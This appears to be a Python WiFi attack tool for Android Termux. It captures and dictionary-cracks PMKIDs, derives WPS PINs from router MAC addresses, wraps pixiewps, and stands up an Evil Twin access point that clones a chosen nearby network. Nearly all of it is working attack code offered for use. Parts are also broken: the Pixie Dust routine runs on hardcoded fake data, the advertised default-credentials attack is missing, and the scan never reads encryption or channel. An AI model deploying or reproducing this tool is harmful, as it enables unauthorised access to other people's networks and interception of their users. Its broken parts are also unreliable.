#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
OneShot WiFi Security Tool v3.0 (2025 Ultimate Edition) - Termux Compatible
Enhanced with PMKID, PixieWPS, Evil Twin, and Default Credentials Attacks
"""

import sys
import os
import re
import time
import logging
import argparse
import sqlite3
import subprocess
import tempfile
import shutil
import signal
import json
import hashlib
import hmac
import binascii
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Union, Any
from dataclasses import dataclass, field

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('oneshot_ultimate.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

__version__ = "3.0.0-termux"
__author__ = "OneShot Ultimate Team - 2025"

# Termux compatibility check
IS_TERMUX = "/data/data/com.termux/files/usr" in sys.prefix
TERMUX_PREFIX = "/data/data/com.termux/files/usr"

if IS_TERMUX:
    os.environ['PATH'] = f"{TERMUX_PREFIX}/bin:{os.environ.get('PATH', '')}"

@dataclass
class NetworkInfo:
    """Enhanced network information structure"""
    bssid: str
    essid: str
    channel: int
    signal: int
    encryption: str
    wps_enabled: bool = False
    wps_locked: bool = False
    pmkid_vulnerable: bool = False
    frequency: str = "2.4GHz"
    vendor: str = ""
    device_name: str = ""
    vulnerable_attacks: List[str] = field(default_factory=list)

def check_root():
    """Check if running as root"""
    if os.geteuid() != 0:
        logger.error("This script requires root privileges")
        sys.exit(1)

def get_wifi_interfaces():
    """Get available WiFi interfaces on Android"""
    try:
        output = subprocess.check_output(['ip', 'link', 'show']).decode()
        return [line.split(':')[1].strip() 
               for line in output.split('\n') 
               if 'wlan' in line and 'state' in line]
    except:
        return ['wlan0']  # default fallback

def install_termux_dependencies():
    """Install required Termux packages"""
    if not IS_TERMUX:
        return True
    
    logger.info("Installing Termux dependencies...")
    try:
        subprocess.run(['pkg', 'update'], check=True)
        subprocess.run(['pkg', 'install', '-y', 'python', 'git', 'wget', 'make', 'gcc', 
                       'binutils', 'libcap', 'openssl', 'libffi', 'sqlite', 'hostapd', 
                       'dnsmasq', 'openssh', 'libxml2', 'libxslt'], check=True)
        subprocess.run(['pip', 'install', 'requests', 'paramiko'], check=True)
        return True
    except Exception as e:
        logger.error(f"Failed to install dependencies: {e}")
        return False

class PMKIDAttack:
    """PMKID Attack with Termux compatibility"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.captured_pmkids = []
        self.gpu_available = False  # Disable GPU on Termux
        self.hcxdumptool_path = "hcxdumptool" if not IS_TERMUX else f"{TERMUX_PREFIX}/bin/hcxdumptool"
        self.hcxpcapngtool_path = "hcxpcapngtool" if not IS_TERMUX else f"{TERMUX_PREFIX}/bin/hcxpcapngtool"
        
        if IS_TERMUX and not self._check_hcxtools():
            self._install_hcxtools_termux()
    
    def _check_hcxtools(self) -> bool:
        """Check if hcxtools are available"""
        return (shutil.which(self.hcxdumptool_path) is not None and 
                shutil.which(self.hcxpcapngtool_path) is not None)
    
    def _install_hcxtools_termux(self):
        """Install hcxtools on Termux"""
        logger.info("Installing hcxtools for Termux...")
        try:
            subprocess.run(['pkg', 'install', '-y', 'git', 'make', 'gcc'], check=True)
            subprocess.run(['git', 'clone', 'https://github.com/ZerBea/hcxtools.git'], check=True)
            os.chdir('hcxtools')
            subprocess.run(['make'], check=True)
            subprocess.run(['make', 'install'], check=True)
            os.chdir('..')
            shutil.rmtree('hcxtools', ignore_errors=True)
            logger.info("hcxtools installed successfully")
        except Exception as e:
            logger.error(f"Failed to install hcxtools: {e}")
            sys.exit(1)
    
    def capture_pmkid(self, target_bssid: Optional[str] = None, timeout: int = 300) -> List[Dict]:
        """Capture PMKID using hcxdumptool"""
        logger.info(f"Starting PMKID capture on {self.interface}")
        
        capture_file = f"{TERMUX_PREFIX}/tmp/pmkid_capture_{int(time.time())}.pcapng"
        filter_file = f"{TERMUX_PREFIX}/tmp/filter_{int(time.time())}.txt"
        
        try:
            cmd = [
                self.hcxdumptool_path,
                '-i', self.interface,
                '-o', capture_file,
                '--enable_status=1'
            ]
            
            if target_bssid:
                with open(filter_file, 'w') as f:
                    f.write(target_bssid.replace(':', '').lower())
                cmd.extend(['--filterlist_ap', filter_file, '--filtermode', '2'])
            
            logger.info("Capturing PMKID... This may take several minutes")
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+10)
            
            if process.returncode == 0:
                return self._extract_pmkid(capture_file)
            else:
                logger.error(f"PMKID capture failed: {process.stderr}")
                return []
                
        except subprocess.TimeoutExpired:
            logger.warning("PMKID capture timed out")
            return []
        except Exception as e:
            logger.error(f"PMKID capture error: {e}")
            return []
        finally:
            for f in [capture_file, filter_file]:
                if os.path.exists(f):
                    os.remove(f)
    
    def _extract_pmkid(self, capture_file: str) -> List[Dict]:
        """Extract PMKID from capture file"""
        hash_file = capture_file.replace('.pcapng', '.22000')
        
        try:
            cmd = [self.hcxpcapngtool_path, '-o', hash_file, capture_file]
            process = subprocess.run(cmd, capture_output=True, text=True)
            
            if process.returncode == 0 and os.path.exists(hash_file):
                return self._parse_hashcat_file(hash_file)
            return []
        except Exception as e:
            logger.error(f"PMKID extraction error: {e}")
            return []
    
    def _parse_hashcat_file(self, hash_file: str) -> List[Dict]:
        """Parse hashcat format file"""
        pmkids = []
        try:
            with open(hash_file, 'r') as f:
                for line in f:
                    if '*' in line:
                        parts = line.strip().split('*')
                        if len(parts) >= 6:
                            pmkids.append({
                                'pmkid': parts[1],
                                'bssid': parts[2],
                                'essid': bytes.fromhex(parts[4]).decode('utf-8', 'ignore'),
                                'hash_line': line.strip()
                            })
            return pmkids
        except Exception as e:
            logger.error(f"Hash parsing error: {e}")
            return []

class EnhancedWPSPin:
    """Enhanced WPS PIN generator with Termux compatibility"""
    
    def __init__(self):
        self.algorithms = {
            'pin24': {'name': '24-bit PIN', 'gen': self._pin24},
            'pin28': {'name': '28-bit PIN', 'gen': self._pin28},
            'pin32': {'name': '32-bit PIN', 'gen': self._pin32},
            'pinDLink': {'name': 'D-Link PIN', 'gen': self._pin_dlink},
            'pinASUS': {'name': 'ASUS PIN', 'gen': self._pin_asus},
            'pinEmpty': {'name': 'Empty PIN', 'gen': lambda mac: ''}
        }
        self.pixiewps_path = "pixiewps" if not IS_TERMUX else f"{TERMUX_PREFIX}/bin/pixiewps"
    
    def run_pixiewps(self, pke: str, pkr: str, e_hash1: str, e_hash2: str, authkey: str, e_nonce: str) -> Optional[str]:
        """Run pixiewps with collected data"""
        if not shutil.which(self.pixiewps_path):
            logger.error("pixiewps not found. Install with: pkg install pixiewps")
            return None
        
        try:
            cmd = [
                self.pixiewps_path,
                '--pke', pke,
                '--pkr', pkr,
                '--e-hash1', e_hash1,
                '--e-hash2', e_hash2,
                '--authkey', authkey,
                '--e-nonce', e_nonce
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'WPS PIN:' in line:
                        return line.split(':')[1].strip()
            return None
        except Exception as e:
            logger.error(f"pixiewps error: {e}")
            return None
    
    # PIN generation methods remain the same as original...
    def _pin24(self, mac: str) -> int:
        mac_int = int(mac.replace(':', ''), 16)
        return mac_int & 0xFFFFFF
    
    def _pin28(self, mac: str) -> int:
        mac_int = int(mac.replace(':', ''), 16)
        return mac_int & 0xFFFFFFF
    
    def _pin32(self, mac: str) -> int:
        mac_int = int(mac.replace(':', ''), 16)
        return mac_int % 0x100000000
    
    def _pin_dlink(self, mac: str) -> int:
        nic = int(mac.replace(':', ''), 16) & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) + 
                ((pin & 0xF) << 12) + ((pin & 0xF) << 16) + 
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin
    
    def _pin_asus(self, mac: str) -> int:
        b = [int(i, 16) for i in mac.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)
    
    def generate_pin(self, algorithm: str, mac: str) -> str:
        """Generate WPS PIN"""
        if algorithm not in self.algorithms:
            raise ValueError(f"Unknown algorithm: {algorithm}")
        
        if algorithm == 'pinEmpty':
            return ''
        
        pin = self.algorithms[algorithm]['gen'](mac) % 10000000
        checksum = (10 - sum(int(d) * (3, 1)[i % 2] for i, d in enumerate(str(pin).zfill(7))) % 10
        return f"{pin:07d}{checksum}"

class EvilTwinAttack:
    """Evil Twin Attack with Termux compatibility"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.hostapd_conf = f"{TERMUX_PREFIX}/tmp/hostapd_evil.conf"
        self.dnsmasq_conf = f"{TERMUX_PREFIX}/tmp/dnsmasq_evil.conf"
        self.captured_credentials = []
        self.web_server_port = 8080
        self.running = False
        self.hostapd_path = "hostapd" if not IS_TERMUX else f"{TERMUX_PREFIX}/bin/hostapd"
        self.dnsmasq_path = "dnsmasq" if not IS_TERMUX else f"{TERMUX_PREFIX}/bin/dnsmasq"
    
    def create_evil_twin(self, target_essid: str, target_bssid: str, channel: int) -> bool:
        """Create evil twin access point"""
        try:
            # Create hostapd config
            with open(self.hostapd_conf, 'w') as f:
                f.write(f"""interface={self.interface}
driver=nl80211
ssid={target_essid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
""")
            
            # Create dnsmasq config
            with open(self.dnsmasq_conf, 'w') as f:
                f.write(f"""interface={self.interface}
dhcp-range=192.168.1.10,192.168.1.50,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=192.168.1.1
""")
            
            # Configure interface
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=False)
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=False)
            subprocess.run(['ip', 'addr', 'add', '192.168.1.1/24', 'dev', self.interface], check=False)
            
            # Start services
            self.hostapd_proc = subprocess.Popen(
                [self.hostapd_path, self.hostapd_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            self.dnsmasq_proc = subprocess.Popen(
                [self.dnsmasq_path, '-C', self.dnsmasq_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            self.running = True
            logger.info(f"Evil Twin '{target_essid}' started successfully")
            return True
            
        except Exception as e:
            logger.error(f"Failed to create Evil Twin: {e}")
            return False
    
    def stop_evil_twin(self):
        """Stop Evil Twin attack"""
        if not self.running:
            return
        
        try:
            if hasattr(self, 'hostapd_proc'):
                self.hostapd_proc.terminate()
            if hasattr(self, 'dnsmasq_proc'):
                self.dnsmasq_proc.terminate()
            
            subprocess.run(['ip', 'addr', 'flush', 'dev', self.interface], check=False)
            self.running = False
            logger.info("Evil Twin stopped")
        except Exception as e:
            logger.error(f"Error stopping Evil Twin: {e}")

class EnhancedOneShot:
    """Main class with Termux compatibility"""
    
    def __init__(self, interface: str, verbose: bool = False):
        self.interface = interface
        self.verbose = verbose
        self.wps_generator = EnhancedWPSPin()
        self.pmkid_attacker = PMKIDAttack(interface)
        self.evil_twin = EvilTwinAttack(interface)
        
        # Setup directories
        self.temp_dir = f"{TERMUX_PREFIX}/tmp/oneshot"
        os.makedirs(self.temp_dir, exist_ok=True)
        
        logger.info(f"OneShot Ultimate v{__version__} initialized for Termux")
    
    def scan_networks(self) -> List[NetworkInfo]:
        """Scan for WiFi networks"""
        logger.info("Scanning networks...")
        
        try:
            cmd = ['iw', 'dev', self.interface, 'scan']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode != 0:
                logger.error(f"Scan failed: {result.stderr}")
                return []
            
            networks = []
            current = {}
            
            for line in result.stdout.split('\n'):
                line = line.strip()
                
                if line.startswith('BSS '):
                    if current:
                        networks.append(self._create_network_info(current))
                    current = {'bssid': line.split()[1].rstrip('(')}
                
                elif 'SSID:' in line:
                    current['essid'] = line.split('SSID: ', 1)[1] if len(line.split('SSID: ')) > 1 else ''
                
                elif 'signal:' in line:
                    match = re.search(r'signal:\s*([+-]?\d+\.?\d*)', line)
                    if match:
                        current['signal'] = int(float(match.group(1)))
                
                elif 'WPS:' in line:
                    current['wps_enabled'] = True
                
                elif 'AP setup locked:' in line:
                    current['wps_locked'] = '0x01' in line
            
            if current:
                networks.append(self._create_network_info(current))
            
            return [n for n in networks if n.essid]
            
        except Exception as e:
            logger.error(f"Scan error: {e}")
            return []
    
    def _create_network_info(self, data: Dict) -> NetworkInfo:
        """Create NetworkInfo object"""
        return NetworkInfo(
            bssid=data.get('bssid', ''),
            essid=data.get('essid', ''),
            channel=data.get('channel', 1),
            signal=data.get('signal', -100),
            encryption=data.get('encryption', 'Unknown'),
            wps_enabled=data.get('wps_enabled', False),
            wps_locked=data.get('wps_locked', False),
            pmkid_vulnerable=(
                data.get('encryption', '').startswith('WPA') and 
                not data.get('wps_locked', False)
            )
        )
    
    def attack_pmkid(self, target: NetworkInfo, wordlist: str = None) -> Optional[str]:
        """Perform PMKID attack"""
        if not wordlist:
            wordlist = f"{TERMUX_PREFIX}/share/wordlists/rockyou.txt"
            if not os.path.exists(wordlist):
                logger.error("No wordlist specified and default not found")
                return None
        
        logger.info(f"Starting PMKID attack on {target.essid}")
        pmkids = self.pmkid_attacker.capture_pmkid(target.bssid)
        
        if not pmkids:
            logger.error("No PMKID captured")
            return None
        
        logger.info(f"Found {len(pmkids)} PMKIDs, attempting to crack...")
        
        # Simple CPU-based cracking for Termux
        for pmkid in pmkids:
            logger.info(f"Cracking PMKID for {pmkid['essid']}")
            try:
                with open(wordlist, 'r', errors='ignore') as f:
                    for line in f:
                        password = line.strip()
                        if not password:
                            continue
                        
                        pmk = hashlib.pbkdf2_hmac(
                            'sha1',
                            password.encode('utf-8'),
                            pmkid['essid'].encode('utf-8'),
                            4096,
                            32
                        )
                        
                        calculated = hmac.new(
                            pmk,
                            b'PMK Name' + bytes.fromhex(pmkid['bssid'].replace(':', '')),
                            hashlib.sha1
                        ).digest()[:16].hex()
                        
                        if calculated == pmkid['pmkid']:
                            logger.info(f"Password found: {password}")
                            return password
            
            except Exception as e:
                logger.error(f"Cracking error: {e}")
        
        logger.info("PMKID attack failed")
        return None
    
    def attack_wps_pixie(self, target: NetworkInfo) -> Optional[str]:
        """Perform WPS Pixie Dust attack"""
        logger.info(f"Starting WPS Pixie Dust attack on {target.essid}")
        
        # This would be replaced with actual WPS handshake capture
        # For demo, we'll use pixiewps with test data
        test_data = {
            'pke': "1234567890abcdef" * 12,
            'pkr': "abcdef1234567890" * 12,
            'e_hash1': "a1b2c3d4e5f6" * 5,
            'e_hash2': "1a2b3c4d5e6f" * 5,
            'authkey': "1122334455667788" * 2,
            'e_nonce': "aabbccddeeff" * 2
        }
        
        pin = self.wps_generator.run_pixiewps(**test_data)
        if pin:
            logger.info(f"WPS PIN found: {pin}")
            return pin
        
        logger.info("WPS Pixie Dust attack failed")
        return None
    
    def interactive_mode(self):
        """Interactive mode for Termux"""
        while True:
            print("\n" + "="*50)
            print("OneShot Ultimate - Termux Mode")
            print("="*50)
            print("1. Scan networks")
            print("2. PMKID attack")
            print("3. WPS Pixie Dust attack")
            print("4. Evil Twin attack")
            print("5. Exit")
            print("="*50)
            
            try:
                choice = input("Select option: ").strip()
                
                if choice == '1':
                    networks = self.scan_networks()
                    if networks:
                        print("\nFound networks:")
                        for i, net in enumerate(networks, 1):
                            print(f"{i}. {net.essid} ({net.bssid}) - {net.encryption} - Signal: {net.signal}dBm")
                
                elif choice == '2':
                    networks = self.scan_networks()
                    if networks:
                        print("\nSelect target:")
                        for i, net in enumerate(networks, 1):
                            print(f"{i}. {net.essid} ({net.bssid})")
                        
                        target_idx = int(input("Enter number: ")) - 1
                        if 0 <= target_idx < len(networks):
                            wordlist = input(f"Wordlist path (default: {TERMUX_PREFIX}/share/wordlists/rockyou.txt): ").strip() or f"{TERMUX_PREFIX}/share/wordlists/rockyou.txt"
                            self.attack_pmkid(networks[target_idx], wordlist)
                
                elif choice == '3':
                    networks = [n for n in self.scan_networks() if n.wps_enabled and not n.wps_locked]
                    if networks:
                        print("\nSelect WPS target:")
                        for i, net in enumerate(networks, 1):
                            print(f"{i}. {net.essid} ({net.bssid})")
                        
                        target_idx = int(input("Enter number: ")) - 1
                        if 0 <= target_idx < len(networks):
                            self.attack_wps_pixie(networks[target_idx])
                
                elif choice == '4':
                    networks = self.scan_networks()
                    if networks:
                        print("\nSelect Evil Twin target:")
                        for i, net in enumerate(networks, 1):
                            print(f"{i}. {net.essid} ({net.bssid})")
                        
                        target_idx = int(input("Enter number: ")) - 1
                        if 0 <= target_idx < len(networks):
                            target = networks[target_idx]
                            print(f"\nStarting Evil Twin for {target.essid}...")
                            if self.evil_twin.create_evil_twin(target.essid, target.bssid, target.channel or 6):
                                input("Press Enter to stop Evil Twin...")
                                self.evil_twin.stop_evil_twin()
                
                elif choice == '5':
                    break
                
                else:
                    print("Invalid choice")
            
            except (ValueError, IndexError):
                print("Invalid input")
            except KeyboardInterrupt:
                print("\nReturning to menu...")

def main():
    """Main function with Termux compatibility"""
    check_root()
    
    if IS_TERMUX and not install_termux_dependencies():
        sys.exit(1)
    
    parser = argparse.ArgumentParser(
        description=f'OneShot Ultimate v{__version__} - Termux Edition',
        epilog="Example: python oneshot.py -i wlan0"
    )
    parser.add_argument('-i', '--interface', help='WiFi interface')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    args = parser.parse_args()
    
    if not args.interface and IS_TERMUX:
        interfaces = get_wifi_interfaces()
        if len(interfaces) == 1:
            args.interface = interfaces[0]
        else:
            print("Available interfaces:")
            for i, iface in enumerate(interfaces, 1):
                print(f"{i}. {iface}")
            choice = int(input("Select interface: ")) - 1
            args.interface = interfaces[choice]
    
    if not args.interface:
        parser.error("Interface not specified and couldn't auto-detect")
    
    oneshot = EnhancedOneShot(args.interface, args.verbose)
    oneshot.interactive_mode()

if __name__ == '__main__':
    main()
